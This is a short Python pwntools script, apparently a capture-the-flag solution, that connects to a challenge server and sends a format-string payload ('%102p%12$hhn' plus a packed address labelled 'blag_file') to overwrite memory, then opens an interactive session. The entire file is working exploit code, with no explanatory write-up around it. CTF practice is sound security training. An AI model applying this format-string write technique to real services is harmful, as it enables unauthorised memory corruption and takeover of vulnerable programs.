from pwn import *

ADDR = 0x4040c0 # address of blag_file

conn = remote('chal.sigpwny.com', 1384)

exploit = b''
exploit += b'%102p%12$hhn____'
# print(len(exploit))
exploit += p64(ADDR)

# print(exploit)

conn.sendline(exploit)

conn.interactive()
